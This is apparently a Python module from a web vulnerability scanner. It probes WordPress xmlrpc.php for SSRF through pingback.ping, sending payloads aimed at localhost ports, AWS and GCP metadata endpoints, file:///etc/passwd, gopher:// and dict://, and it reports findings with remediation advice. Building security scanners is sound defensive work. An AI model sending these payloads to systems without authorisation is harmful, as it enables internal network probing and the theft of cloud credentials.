"""SSRF via XML-RPC pingback — test internal network access, protocols, cloud metadata."""

from __future__ import annotations

import time
from typing import TYPE_CHECKING

from core.models import Evidence, Finding, Severity, Confidence, FindingType, Compliance
from modules.base import BazookaModule, ModuleResult

if TYPE_CHECKING:
    from core.engine import ScanContext
    from core.session import BazookaSession


def _pingback_payload(source: str, target: str) -> str:
    return f"""<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName><params>
<param><value><string>{source}</string></value></param>
<param><value><string>{target}</string></value></param>
</params></methodCall>"""


class SSRFXMLRPCModule(BazookaModule):
    name = "vuln.ssrf_xmlrpc"
    phase = "vuln"
    description = "SSRF via XML-RPC pingback"
    profiles = ["standard", "aggressive"]

    async def run(self, ctx: ScanContext, session: BazookaSession) -> ModuleResult:
        result = ModuleResult()
        base = ctx.target.url
        xmlrpc_url = f"{base}/xmlrpc.php"

        # Only run if pingback is available
        if not ctx.data.get("pingback_available", False):
            # Check ourselves
            methods = ctx.data.get("xmlrpc_methods", [])
            if "pingback.ping" not in methods:
                return result

        # Test 1: Basic SSRF to localhost
        target_url = f"{base}/"  # Valid target URL on the same site
        tests = [
            ("http://127.0.0.1/", "localhost HTTP"),
            ("http://127.0.0.1:22/", "localhost SSH"),
            ("http://127.0.0.1:3306/", "localhost MySQL"),
            ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
            ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ]

        ssrf_confirmed = False
        for source, label in tests:
            payload = _pingback_payload(source, target_url)
            try:
                start = time.time()
                resp = await session.post(
                    xmlrpc_url,
                    content=payload,
                    headers={"Content-Type": "text/xml"},
                    use_cache=False,
                )
                elapsed = time.time() - start

                if resp.status_code == 200 and "<fault>" not in resp.text.lower():
                    # faultCode 0 or success = SSRF likely working
                    if "faultCode" not in resp.text or "<int>0</int>" in resp.text:
                        ssrf_confirmed = True
                        result.add_data(f"ssrf_{label.replace(' ', '_')}", {
                            "status": resp.status_code,
                            "time": round(elapsed, 2),
                            "response_excerpt": resp.text[:200],
                        })

            except Exception:
                continue

        if ssrf_confirmed:
            result.add_finding(Finding(
                id="VULN-SSRF-001",
                title="SSRF confirmee via XML-RPC pingback",
                severity=Severity.CRITICAL,
                cvss_score=9.1,
                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
                confidence=Confidence.CONFIRMED,
                finding_type=FindingType.DESIGN_FLAW,
                description=(
                    "Le serveur effectue des requetes HTTP vers des URLs arbitraires via pingback.ping. "
                    "Cela permet d'acceder au reseau interne, scanner des ports, et potentiellement "
                    "lire des metadata cloud (AWS/GCP/Azure)."
                ),
                evidence=Evidence(
                    request=f"POST {xmlrpc_url}\npingback.ping(http://127.0.0.1/, {target_url})",
                    response_status=200,
                ),
                impact=(
                    "Acces au reseau interne, scan de ports, lecture de credentials cloud metadata, "
                    "pivot vers d'autres services internes."
                ),
                remediation="Desactiver pingback.ping via plugin ou supprimer XML-RPC entierement.",
                compliance=Compliance(
                    owasp_2021="A10:2021 - Server-Side Request Forgery",
                    cwe="CWE-918",
                    mitre_attack="T1090 - Proxy",
                ),
                references=[
                    "https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/",
                ],
                phase="vuln", module=self.name,
                tags=["ssrf", "xmlrpc", "pingback"],
            ))

        # Test 2: Protocol handlers (file://, gopher://)
        protocol_tests = [
            ("file:///etc/passwd", "file://"),
            ("gopher://127.0.0.1:25/", "gopher://"),
            ("dict://127.0.0.1:11211/stats", "dict://"),
        ]
        for source, proto_label in protocol_tests:
            payload = _pingback_payload(source, target_url)
            try:
                resp = await session.post(
                    xmlrpc_url,
                    content=payload,
                    headers={"Content-Type": "text/xml"},
                    use_cache=False,
                )
                if resp.status_code == 200 and "faultCode" in resp.text:
                    if "<int>0</int>" in resp.text:
                        result.add_finding(Finding(
                            id=f"VULN-SSRF-PROTO-{proto_label.replace('://', '')}",
                            title=f"Protocole {proto_label} accepte via SSRF",
                            severity=Severity.HIGH,
                            cvss_score=7.5,
                            confidence=Confidence.LIKELY,
                            finding_type=FindingType.DESIGN_FLAW,
                            description=f"Le protocole {proto_label} est accepte par pingback.ping (faultCode 0).",
                            impact=f"{proto_label} peut etre utilise pour lire des fichiers ou interagir avec des services internes.",
                            remediation="Desactiver XML-RPC.",
                            compliance=Compliance(owasp_2021="A10:2021", cwe="CWE-918"),
                            phase="vuln", module=self.name,
                        ))
            except Exception:
                continue

        return result

    def should_run(self, ctx) -> bool:
        return ctx.profile != "bugbounty"
